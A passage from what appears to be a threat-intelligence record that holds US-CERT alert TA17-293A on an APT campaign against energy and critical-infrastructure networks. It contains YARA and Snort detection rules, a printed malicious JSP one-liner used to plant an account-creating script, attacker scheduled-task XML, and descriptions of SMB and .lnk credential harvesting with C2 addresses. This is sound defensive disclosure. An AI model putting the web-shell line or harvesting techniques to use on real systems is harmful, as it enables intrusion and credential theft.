29 3C 3C 34 7C ?? 3E 3E 32 2C ?? 3D 28 ?? 26 33 29 3C 3C 36 7C ?? 2C ?? 2B 3D [1-2] 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29 2C 36 34 21 3D ?? 26 26 28 ?? 2B 3D 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29}</code></p><p><code>      $decode4 = {73 75 62 73 74 72 69 6E 67 28 34 2C ?? 2E 6C 65 6E 67 74 68 29}</code></p><p><code>      $func_call=\"a(\\\"\"</code></p><p><code>condition:</code></p><p><code>      filesize &lt; 20KB and #func_call &gt; 20 and all of ($decode*)</code></p><p><code>}</code></p><p> </p><p><code>rule Query_XML_Code_MAL_DOC</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>      name= \"Query_XML_Code_MAL_DOC\"</code></p><p><code>      author = \"other\"</code></p><p><code>strings:</code></p><p><code>      $zip_magic = { 50 4b 03 04 }</code></p><p><code>      $dir = \"word/_rels/\" ascii</code></p><p><code>      $dir2 = \"word/theme/theme1.xml\" ascii</code></p><p><code>      $style = \"word/styles.xml\" ascii</code></p><p><code>condition:</code></p><p><code>      $zip_magic at 0 and $dir at 0x0145 and $dir2 at 0x02b7 and $style at 0x08fd</code></p><p><code>}</code></p>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>This APT actor’s campaign has affected multiple organizations in the energy, nuclear, water, aviation, construction, and critical manufacturing sectors.</p>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <p>DHS and FBI encourage network users and administrators to use the following detection and prevention guidelines to help defend against this activity.</p><h4>Network and Host-based Signatures</h4><p>DHS and FBI recommend that network administrators review the IP addresses, domain names, file hashes, and YARA and Snort signatures provided and add the IPs to their watch list to determine whether malicious activity is occurring within their organization. Reviewing network perimeter netflow will help determine whether a network has experienced suspicious activity. Network defenders and malware analysts should use the YARA and Snort signatures provided in the associated YARA and .txt file to identify malicious activity.</p><h4>Detections and Prevention Measures</h4><ul><li>Users and administrators can detect spear phishing, watering hole, web shell, and remote access activity by comparing all IP addresses and domain names listed in the IOC packages to the following locations:<ul><li>network intrusion detection system/network intrusion protection system  logs,</li><li>web content logs,</li><li>proxy server logs,</li><li>domain name server resolution logs,</li><li>packet capture (PCAP) repositories,</li><li>firewall logs,</li><li>workstation Internet browsing history logs,</li><li>host-based intrusion detection system /host-based intrusion prevention system (HIPS) logs,</li><li>data loss prevention logs,</li><li>exchange server logs,</li><li>user mailboxes,</li><li>mail filter logs,</li><li>mail content logs,</li><li>AV mail logs,</li><li>OWA logs,</li><li>Blackberry Enterprise Server logs, and</li><li>Mobile Device Management logs.</li></ul></li><li>To detect the presence of web shells on external-facing servers, compare IP addresses, filenames, and file hashes listed in the IOC packages with the following locations:<ul><li>application logs,</li><li>IIS/Apache logs,</li><li>file system,</li><li>intrusion detection system/ intrusion prevention system logs,</li><li>PCAP repositories,</li><li>firewall logs, and</li><li>reverse proxy.</li></ul></li><li>Detect spear-phishing by searching workstation file systems, as well as network-based user directories, for attachment filenames and hashes found in the IOC packages.</li><li>Detect persistence in VDI environments by searching file shares containing user profiles for all .lnk files.</li><li>Detect evasion techniques by the threat actors by identifying deleted logs. This can be done by reviewing last-seen entries and by searching for event 104 on Windows system logs.</li><li>Detect persistence by reviewing all administrator accounts on systems to identify unauthorized accounts, especially those created recently.</li><li>Detect the malicious use of legitimate credentials by reviewing the access times of remotely accessible systems for all users. Any unusual login times should be reviewed by the account owners.</li><li>Detect the malicious use of legitimate credentials by validating all remote desktop and VPN sessions of any user’s credentials suspected to be compromised.</li><li>Detect spear-phishing by searching OWA logs for all IP addresses listed in the IOC packages.</li><li>Detect spear-phishing through a network by validating all new email accounts created on mail servers, especially those with external user access.</li><li>Detect persistence on servers by searching system logs for all filenames listed in the IOC packages.</li><li>Detect lateral movement and privilege escalation by searching PowerShell logs for all filenames ending in “.ps1” contained in the IOC packages. (Note: requires PowerShell version 5, and PowerShell logging must be enabled prior to the activity.)</li><li>Detect persistence by reviewing all installed applications on critical systems for unauthorized applications, specifically note FortiClient VPN and Python 2.7.</li><li>Detect persistence by searching for the value of “REG_DWORD 100” at registry location “HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal”. Services\\MaxInstanceCount” and the value of “REG_DWORD 1” at location “HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\\dontdisplaylastusername”.</li><li>Detect installation by searching all proxy logs for downloads from URIs without domain names.</li></ul><h4>General Best Practices Applicable to this Campaign:</h4><ul><li>Prevent external communication of all versions of SMB and related protocols at the network boundary by blocking TCP ports 139 and 445 with related UDP port 137. See the NCCIC/US-CERT publication on <a href=\"https://www.us-cert.gov/ncas/current-activity/2017/01/16/SMB-Security-Best-Practices\">SMB Security Best Practices </a>for more information.</li><li>Block the Web-based Distributed Authoring and Versioning (WebDAV) protocol on border gateway devices on the network.</li><li>Monitor VPN logs for abnormal activity (e.g., off-hour logins, unauthorized IP address logins, and multiple concurrent logins).</li><li>Deploy web and email filters on the network. Configure these devices to scan for known bad domain names, sources, and addresses; block these before receiving and downloading messages. This action will help to reduce the attack surface at the network’s first level of defense. Scan all emails, attachments, and downloads (both on the host and at the mail gateway) with a reputable anti-virus solution that includes cloud reputation services.</li><li>Segment any critical networks or control systems from business systems and networks according to industry best practices.</li><li>Ensure adequate logging and visibility on ingress and egress points.</li><li>Ensure the use of PowerShell version 5, with enhanced logging enabled. Older versions of PowerShell do not provide adequate logging of the PowerShell commands an attacker may have executed. Enable PowerShell module logging, script block logging, and transcription. Send the associated logs to a centralized log repository for monitoring and analysis. See the FireEye blog post <a href=\"http://Greater Visibility through PowerShell Logging\">Greater Visibility through PowerShell Logging </a>for more information.</li><li>Implement the prevention, detection, and mitigation strategies outlined in the NCCIC/US-CERT Alert TA15-314A – <a href=\"https://www.us-cert.gov/ncas/alerts/TA15-314A\">Compromised Web Servers and Web Shells – Threat Awareness and Guidance</a>.</li><li>Establish a training mechanism to inform end users on proper email and web usage, highlighting current information and analysis, and including common indicators of phishing. End users should have clear instructions on how to report unusual or suspicious emails.</li><li>Implement application directory whitelisting. System administrators may implement application or application directory whitelisting through Microsoft Software Restriction Policy, AppLocker, or similar software. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), SYSTEM32, and any ICS software folders. All other locations should be disallowed unless an exception is granted.</li><li>Block RDP connections originating from untrusted external addresses unless an exception exists; routinely review exceptions on a regular basis for validity.</li><li>Store system logs of mission critical systems for at least one year within a security information event management tool.</li><li>Ensure applications are configured to log the proper level of detail for an incident response investigation.</li><li>Consider implementing HIPS or other controls to prevent unauthorized code execution.</li><li>Establish least-privilege controls.</li><li>Reduce the number of Active Directory domain and enterprise administrator accounts.</li><li>Based on the suspected level of compromise, reset all user, administrator, and service account credentials across all local and domain systems.</li><li>Establish a password policy to require complex passwords for all users.</li><li>Ensure that accounts for network administration do not have external connectivity.</li><li>Ensure that network administrators use non-privileged accounts for email and Internet access.</li><li>Use two-factor authentication for all authentication, with special emphasis on any external-facing interfaces and high-risk environments (e.g., remote access, privileged access, and access to sensitive data).</li><li>Implement a process for logging and auditing activities conducted by privileged accounts.</li><li>Enable logging and alerting on privilege escalations and role changes.</li><li>Periodically conduct searches of publically available information to ensure no sensitive information has been disclosed. Review photographs and documents for sensitive data that may have inadvertently been included.</li><li>Assign sufficient personnel to review logs, including records of alerts.</li><li>Complete independent security (as opposed to compliance) risk review.</li><li>Create and participate in information sharing programs.</li><li>Create and maintain network and system documentation to aid in timely incident response. Documentation should include network diagrams, asset owners, type of asset, and an incident response plan.</li></ul><p><strong>Report Notice</strong></p><p>DHS encourages recipients who identify the use of tools or techniques discussed in this document to report information to DHS or law enforcement immediately. To request incident response resources or technical assistance, contact NCCIC at <a href=\"https://www.us-cert.govmailto:NCCICcustomerservice@hq.dhs.gov\">NCCICcustomerservice@hq.dhs.gov </a>or 888-282-0870.</p>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    \t<li><a href=\"\">[1] FireEye. Factors Motivating Cyber Espionage Against the Energy Sector. September 3, 2015 09:21:00AM, 15-00008886, Version: 2</a></li>\n            \t\t    \t<li><a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[2] Symantec. Dragonfly: Western energy sector targeted by sophisticated attack group. September 6, 2017. </a></li>\n            \t\t    \t<li><a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[2] Symantec. Dragonfly: Western energy sector targeted by sophisticated attack group. September 6, 2017.</a></li>\n            \t\t    \t<li><a href=\"\">[4] CCIRC CF17-010 UPDATE</a></li>\n            \t\t    \t<li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">[5] MIFR-10127623</a></li>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>October 20, 2017: Initial version</li>\n\t\t    \t\t\t    \t<li>March 15, 2018: Updated to provide guidance that this alert has been superseded by newer information.</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />",
			"external_references": [
				{
					"external_id": "10082 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA17-293A",
					"source_name": "open source",
					"description": "Original release date: October 20, 2017 | Last revised: March 15, 2018<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <ul><li>Domain Controllers</li><li>File Servers</li><li>Email Servers</li></ul>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p style=\"color: red;\"><strong>This alert has been superseded by newer information. The old alert is provided below for historical reference only. For the newest version, please see <a href=\"https://us-cert.gov/ncas/alerts/TA18-074A\">TA18-074A</a>.</strong></p><p> </p><p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). This alert provides information on advanced persistent threat (APT) actions targeting government entities and organizations in the energy, nuclear, water, aviation, and critical manufacturing sectors. Working with U.S. and international partners, DHS and FBI identified victims in these sectors. This report contains indicators of compromise (IOCs) and technical details on the tactics, techniques, and procedures (TTPs) used by APT actors on compromised victims’ networks.</p><p> </p><p>DHS assesses this activity as a multi-stage intrusion campaign by threat actors targeting low security and small networks to gain access and move laterally to networks of major, high value asset owners within the energy sector. Based on malware analysis and observed IOCs, DHS has confidence that this campaign is still ongoing, and threat actors are actively pursuing their ultimate objectives over a long-term campaign. The intent of this product is to educate network defenders and enable them to identify and reduce exposure to malicious activity.</p><p>For a downloadable copy of IOC packages and associated files, see:</p><ul><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/TA17-293A_TLP_WHITE_CSV.csv\">TA17-293A_TLP_WHITE.csv</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/TA17-293A%20_TLP_%20WHITE.xml\">TA17-293A_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">MIFR-10127623_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE_stix.xml\">MIFR-10127623_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128327_TLP_WHITE.pdf\">MIFR-10128327_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128327_TLP_WHITE_stix.xml\">MIFR-10128327_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128336_TLP_WHITE.pdf\">MIFR-10128336_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128336_TLP_WHITE_stix.xml\">MIFR-10128336_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128830_TLP_WHITE.pdf\">MIFR-10128830­_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128830_TLP_WHITE_stix.xml\">MIFR-10128830­_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128883_TLP_WHITE.pdf\">MIFR-10128883_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128883_TLP_WHITE_stix.xml\">MIFR-10128883_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10135300_TLP_WHITE.pdf\">MIFR-10135300_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10135300_TLP_WHITE_stix.xml\">MIFR-10135300_TLP_WHITE_stix.xml</a></li></ul><p>Contact DHS or law enforcement immediately to report an intrusion and to request incident response resources or technical assistance.</p>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>Since at least May 2017, threat actors have targeted government entities and the energy, water, aviation, nuclear, and critical manufacturing sectors, and, in some cases, have leveraged their capabilities to compromise victims’ networks. Historically, cyber threat actors have targeted the energy sector with various results, ranging from cyber espionage to the ability to disrupt energy systems in the event of a hostile conflict. [1] Historically, threat actors have also targeted other critical infrastructure sectors with similar campaigns.</p><p>Analysis by DHS, FBI, and trusted partners has identified distinct indicators and behaviors related to this activity. Of specific note, the report Dragonfly: Western energy sector targeted by sophisticated attack group, released by Symantec on September 6, 2017, provides additional information about this ongoing campaign. <a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[2]</a></p><p>This campaign comprises two distinct categories of victims: staging and intended targets. The initial victims are peripheral organizations such as trusted third party suppliers with less secure networks. The initial victims are referred to as “staging targets” throughout this alert. The threat actor uses the staging targets’ networks as pivot points and malware repositories when targeting their final intended victims. The ultimate objective of the cyber threat actors is to compromise organizational networks, which are referred throughout this alert as “intended target.”</p><h4>Technical Details</h4><p>The threat actors in this campaign employed a variety of TTPs, including:</p><ul><li>open-source reconnaissance,</li><li>spear-phishing emails (from compromised legitimate accounts),</li><li>watering-hole domains,</li><li>host-based exploitation,</li><li>industrial control system (ICS) infrastructure targeting, and</li><li>ongoing credential gathering.</li></ul><h4>Using Cyber Kill Chain for Analysis</h4><p>DHS leveraged the Cyber Kill Chain model to analyze, discuss, and dissect malicious cyber activity. Phases of the model include reconnaissance, weaponization, delivery, exploitation, installation, command and control, and actions on the objective. This section will provide a high-level overview of activity within this framework.</p><p><strong>Stage 1: Reconnaissance</strong></p><p>The threat actors appear to have deliberately chosen the organizations they targeted, rather than pursuing them as targets of opportunity. Staging targets held preexisting relationships with many of the intended targets. It is known that threat actors are actively accessing publicly available information hosted by organization-monitored networks. DHS further assesses that threat actors are seeking to identify information pertaining to network and organizational design, as well as control system capabilities, within organizations.</p><p>Forensic analysis identified that threat actors are conducting open-source reconnaissance of their targets, gathering information posted on company-controlled websites. This is a common tactic for collecting the information needed for targeted spear-phishing attempts. In some cases, information posted to company websites, especially information that may appear to be innocuous, may contain operationally sensitive information. As an example, the threat actors downloaded a small photo from a publically accessible human resources page. The image, when expanded, was a high-resolution photo that displayed control systems equipment models and status information in the background.</p><p>Analysis also revealed that the threat actors used compromised staging target networks to conduct open-source reconnaissance to identify potential targets of interest and intended targets. “Targets of interest” refers to organizations that DHS observed the threat actors showing an active interest in, but where no compromise was reported. Specifically, the threat actors accessed publically web-based remote access infrastructure such as websites, remote email access portals, and virtual private network (VPN) connections.</p><p><strong>Stage 2: Weaponization</strong></p><h5>Spear-Phishing Email TTPs</h5><p>Throughout the spear-phishing campaign, threat actors used email attachments to leverage legitimate Microsoft Office functions to retrieve a document from a remote server using the Server Message Block (SMB) protocol. (An example of this request is: file[:]//&lt;remote IP address&gt;/Normal.dotm). As a part of the standard processes executed by Microsoft Word, this request authenticates the client with the server, sending the user’s credential hash to the remote server prior to retrieving the requested file. (Note: It is not necessary for the file to be retrieved for the transfer of credentials to occur.) The threat actors then likely used password-cracking techniques to obtain the plaintext password. Once actors obtain valid credentials, they are able to masquerade as authorized users.</p><p><strong>Stage 3: Delivery</strong></p><p>When seeking to compromise the target network, threat actors used a spear-phishing email campaign that differed from previously reported TTPs. The spear-phishing email used a generic contract agreement theme, with the subject line “AGREEMENT &amp; Confidential”, and which contained a generic PDF document, titled “’’document.pdf”. (Note the inclusion of two single apostrophes at the beginning of the attachment name.) The PDF itself was not malicious and did not contain any active code. The document prompted the user to click on a link should a download not automatically begin. (Note: No code within the PDF initiated a download.) The link directs users to a website via a shortened URL, which may prompt them to retrieve a malicious file.</p><p>In previous reporting, DHS and FBI identified the common themes used in these spear-phishing emails, all emails referred to control systems or process control systems. The threat actors continue to use these themes, specifically against intended target organizations. Email messages include references to common industrial control equipment and protocols. The emails leveraged malicious Microsoft Word attachments that appear to be legitimate résumés or curricula vitae (CVs) for industrial control systems personnel, as well as invitations and policy documents that entice the user to open the attachment. The list of file names has been published in the IOC.</p><p><strong>Stage 4: Exploitation</strong></p><p>Threat actors used distinct and unusual TTPs (i.e., successive redirects) in the phishing campaign directed at staging targets. Emails contained a stacked URL-shortening link that directed the user to http://bit[.]ly/2m0x8IH link, which redirected the user to http://tinyurl[.]com/h3sdqck link, which redirected the user to the ultimate destination of http://imageliners[.]com/nitel. The imageliner[.]com website contained an email address and password input fields mimicking a login page for a website.</p><p>When exploiting the intended targets, threat actors used malicious .docx files to capture user credentials, however, DHS did not observe the actors establishing persistence on the user’s system. The documents attempt to retrieve a file through a “file:\\\\” connection over SMB using Transmission Control Protocol (TCP) ports 445 or 139 and User Datagram Protocol (UDP) ports 137 or 138. This connection is made to a command and control (C2) server — either a server owned by the threat actors or that of a compromised system owned by a staging location victim. When a user is authenticated as a domain user, this will provide the C2 server with the hash of the victim. Local users will receive a graphical user interface (GUI) prompt to enter a username and password. This information will be provided to the C2 over TCP ports 445 or 139 and UDP ports 137 or 138. (Note: A file transfer is not necessary for a loss of credential information.) Symantec’s report associates this behavior to the Dragonfly threat actors in this campaign. <a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[3]</a></p><h5><strong>Use of Watering Hole Domains</strong></h5><p>One of the threat actors’ primary uses for staging targets is to develop watering holes. The threat actors compromise the infrastructure of trusted organizations to reach intended targets. [4] Although these watering holes may host legitimate content by reputable organizations, the threat actors have altered them to contain and reference malicious content. Approximately half of the known watering holes are trade publications and informational websites related to process control, ICS, or critical infrastructure.</p><p>Using a similar SMB collection technique, the actors manipulated these websites by altering JavaScript and PHP files that redirect to an IP address on port 445 for credential harvesting. The compromised sites include both custom developed web applications and template-based frameworks. The threat actors injected a line of code into header.php, a legitimate PHP file that carried out the redirected traffic.</p><p>There is no indication that threat actors used zero-day exploits to manipulate the sites; the threat actors more likely used legitimate credentials to access the website content directly.</p><p><strong>Stage 5: Installation</strong></p><p>The threat actors leveraged compromised credentials to access victims’ networks where multi-factor authentication is not used. <a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">[5]</a> Once inside of an intended target’s network, the threat actors downloaded tools from a remote server. The initial versions of the file names contained .txt extensions and were renamed to the appropriate extension, typically .exe or .zip.</p><p>In one example, after gaining remote access to the network of an intended victim, the threat actor carried out the following actions:</p><ul><li>The threat actor connected to 91.183.104[.]150 and downloaded multiple files, specifically the file INST.txt.</li><li>The files were renamed to new extensions, with INST.txt being renamed INST.exe.</li><li>The files were executed on the host and then immediately deleted.</li><li>The execution of INST.exe triggered a download of ntdll.exe, and shortly after, ntdll.exe appeared in the running process list of a compromised system of an intended target.</li></ul><p>In their report on Dragonfly, Symantec associated the MD5 hash of INST.exe to Backdoor.Goodor. The MD5 hashes for the previously mentioned files can be found in the IOC list above.</p><p>Several of these files were scripts that were used for creating the initial account leveraged by the threat actors. The initial script symantec_help.jsp contained a one-line reference to a malicious script. It was located at C:\\Program Files (x86)\\Symantec\\Symantec Endpoint Protection Manager\\tomcat\\webapps\\ROOT\\.</p><p><strong>Contents of symantec_help.jsp</strong></p><p>____________________________________________________________________________________________________________________</p><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"width: 100%;\"><tbody><tr><td><p>&lt;% Runtime.getRuntime().exec(\"cmd /C \\\"\" + System.getProperty(\"user.dir\") + \"\\\\..\\\\webapps\\\\ROOT\\\\&lt;REDACTED SCRIPT NAME&gt;\\\"\"); %&gt;</p></td></tr></tbody></table><p>____________________________________________________________________________________________________________________</p><p>The malicious script created a user account, disabled the host-based firewall, and globally opened port 3389 for Remote Desktop Protocol (RDP) access. The script then attempted to add the newly created account to the administrators group for elevated privileges. This script contained hard-coded values for the group name “administrator” in Spanish, Italian, German, French, and English.</p><p>In addition, the threat actors also created a scheduled task “reset”, which was designed to automatically log out of their newly created account every eight hours.</p><p><strong>Contents of Scheduled Task</strong></p><p><strong>____________________________________________________________________________________________________________________</strong></p><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"width: 100%;\"><tbody><tr><td><p>&lt;?xml version=\"1.0\" encoding=\"UTF-16\"?&gt;</p><p>&lt;Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"&gt;</p><p> &lt;RegistrationInfo&gt;</p><p>  &lt;Date&gt;2017-06-25T11:51:17.4848488&lt;/Date&gt;</p><p>  &lt;Author&gt;&lt;REDACTED&gt;&lt;/Author&gt;</p><p> &lt;/RegistrationInfo&gt;</p><p> &lt;Triggers&gt;</p><p>  &lt;TimeTrigger&gt;</p><p>   &lt;StartBoundary&gt;2017-06-25T12:30:29&lt;/StartBoundary&gt;</p><p>   &lt;Enabled&gt;true&lt;/Enabled&gt;</p><p>  &lt;/TimeTrigger&gt;</p><p> &lt;/Triggers&gt;</p><p> &lt;Principals&gt;</p><p>  &lt;Principal id=\"Author\"&gt;</p><p>   &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;</p><p>   &lt;UserId&gt;&lt;REDACTED USERNAME&gt;&lt;/UserId&gt;</p><p>   &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;</p><p>  &lt;/Principal&gt;</p><p> &lt;/Principals&gt;</p><p> &lt;Settings&gt;</p><p>  &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;</p><p>  &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;</p><p>  &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;</p><p>  &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;</p><p>  &lt;StartWhenAvailable&gt;false&lt;/StartWhenAvailable&gt;</p><p>  &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;</p><p>  &lt;IdleSettings&gt;</p><p>   &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;</p><p>   &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;</p><p>  &lt;/IdleSettings&gt;</p><p>  &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;</p><p>  &lt;Enabled&gt;true&lt;/Enabled&gt;</p><p>  &lt;Hidden&gt;false&lt;/Hidden&gt;</p><p>  &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;</p><p>  &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;</p><p>  &lt;ExecutionTimeLimit&gt;P3D&lt;/ExecutionTimeLimit&gt;</p><p>  &lt;Priority&gt;7&lt;/Priority&gt;</p><p> &lt;/Settings&gt;</p><p> &lt;Actions Context=\"Author\"&gt;</p><p>  &lt;Exec&gt;</p><p>   &lt;Command&gt;logoff&lt;/Command&gt;</p><p>  &lt;/Exec&gt;</p><p> &lt;/Actions&gt;</p><p>&lt;/Task&gt;</p></td></tr></tbody></table><p>____________________________________________________________________________________________________________________</p><p>After achieving access to staging targets, the threat actors installed tools to carry out their mission. On one occasion, threat actors installed the free version of Forticlient, which was presumably used as a VPN client for intended targets.</p><p>Consistent with the perceived goal of credential harvesting, the threat actor was observed dropping and executing open source and free tools such as Hydra, SecretsDump, and CrackMapExec. The naming convention and download locations suggest that these files were downloaded directly from publically available locations such as GitHub. Forensic analysis indicates that many of these tools were executed during the timeframe in which the threat actor was accessing the system. Of note, the threat actor installed Python 2.7 on a compromised host of one staging victim, and a Python script was seen at C:\\Users\\&lt;Redacted Username&gt;\\Desktop\\OWAExchange\\. In the previous folder structure, a subfolder named “out” held multiple text files.</p><h5>Persistence Through .LNK File Manipulation</h5><p>The threat actors manipulated .lnk files to repeatedly gather user credentials. Default Windows functionality enables icons to be loaded from a local Windows repository. The threat actors exploited this built-in Windows functionality by setting the icon path to their remote controlled server. When the user browses to the directory, Windows attempts to load the icon and initiate an SMB authentication session. During this process, the active user’s credentials are passed through the attempted SMB connection. The threat actors used this tactic in both Virtual Desktop Infrastructure (VDI) and traditional environments.</p><p><img alt=\"Parsed output for file: SETROUTE.lnk\" src=\"https://www.us-cert.gov/sites/default/files/publications/TA17-293A%20Image1.png\" style=\"width: 543px; height: 502px; float: left;\" /></p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p>Three of the observed .lnk files were SETROUTE.lnk, notepad.exe.lnk, and Document.lnk. These names appear to be contextual, and threat actors may use a variety of other file names within this tactic. Two of the remote servers observed in these .lnk files were 62.8.193[.]206 and 5.153.58[.]45.</p><h5>Establishing Local Accounts</h5><p>The threat actors created accounts on the staging target for ongoing operations. These accounts, masquerading as legitimate service accounts, appeared to be tailored to each individual staging target. Each account created by the threat actors served a specific purpose in their operation. DHS and FBI identified the creation of four local accounts on a compromised server. The server operated as both a domain controller and an email server for a staging target.</p><p><strong>Account 1:</strong> The threat actors created a local account, which was named to mimic backup services of the staging target. This account was created by the aforementioned malicious script. The threat actors used this account to conduct open-source reconnaissance and remotely access intended targets. This account was also used to remove the Forticlient software.</p><p><strong>Account 2:</strong> Account 1 was used to create Account 2 to impersonate an email administration account. The only observed action was to create Account 3.</p><p><strong>Account 3:</strong> The threat actors created Account 3 in the staging victim’s Microsoft Exchange Server. A PowerShell script created this account during an RDP session while the threat actor was authenticated as Account 2. The naming conventions of the created Microsoft Exchange account followed that of the staging target (e.g., first initial concatenated with the last name).</p><p><strong>Account 4:</strong> In the latter stage of the compromise, the threat actor used Account 1 to create Account 4, a local administrator account. Account 4 was then used to delete the following logs: system, security, terminal services, remote services, and audit. Registry analysis indicated that this activity was likely scripted.</p><p><strong>Stage 6: Command and Control</strong></p><p>The threat actors commonly use web shells to compromise publically available servers to gain a foothold into internal networks. This activity has been observed on both web and email servers. The threat actors then establish an encrypted connection over port 443 to the web shell. Once connected, the threat actors download additional malicious files from the threat actors’ servers to the publically available server. Two of the web shells (AutoDiscover.aspx and global.aspx) used by the actors are detailed in the accompanying IOC list. Despite having different file names, the MD5 hashes of the two web shells indicated that the two files were the same file. These web shells have been associated with the ciklon_z webshell.</p><p>DHS and FBI identified the threat actors leveraging remote access services and infrastructure, such as VPN, RDP, and Outlook Web Access (OWA). The threat actors used staging targets to connect to several intended targets, effectively turning the staging targets into command and control points. To date, it is presumed that the threat actors have targeted services that use single-factor authentication. DHS believes that the threat actors employ this methodology to avoid detection and attribution.</p><h5>Targeting of ICS and SCADA Infrastructure</h5><p>Upon gaining access to intended victims, the threat actors conducted reconnaissance operations within the network. Specifically, the threat actors focused on identifying and browsing file servers within the intended victim’s network. The threat actors viewed files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems. Based on DHS analysis of existing compromises, these files were originally named containing ICS vendor names and ICS reference documents pertaining to the organization (e.g., “SCADA WIRING DIAGRAM.pdf” or “SCADA PANEL LAYOUTS.xlsx”).</p><p>In one instance, the threat actors accessed workstations and servers on a corporate network that contained data output from control systems within energy generation facilities. In this same incident, the threat actors created a malicious scheduled task that invoked “scr.exe” with the arguments “scr.jpg”. The MD5 hash of scr.exe matched the MD5 of ScreenUtil, a tool used by the threat actor, as reported in the Symantec Dragonfly 2.0 report.</p><h4>Detection and Response</h4><p>IOCs related to this campaign are provided within the accompanying .csv and .stix files of this alert. DHS and FBI recommend that network administrators review the IP addresses, domain names, file hashes, network signatures, and YARA rules provided and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization. System owners are also advised to run the YARA tool on any system suspected to have been targeted by these APT actors.</p><h5>Network Signatures and Host-Based Rules</h5><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with threat actors TTPs. Although these network signatures and host-based rules were created using a comprehensive vetting process, the possibility of false positives always remains.</p><h5>Network Signatures</h5><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/aspnet_client/system_web/4_0_30319/update/' (Beacon)\"; sid:42000000; rev:1; flow:established,to_server; content:\"/aspnet_client/system_web/4_0_30319/update/\"; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)</code></p><p><code>___________________________________</code></p><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/img/bson021.dat'\"; sid:42000001; rev:1; flow:established,to_server; content:\"/img/bson021.dat\"; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service 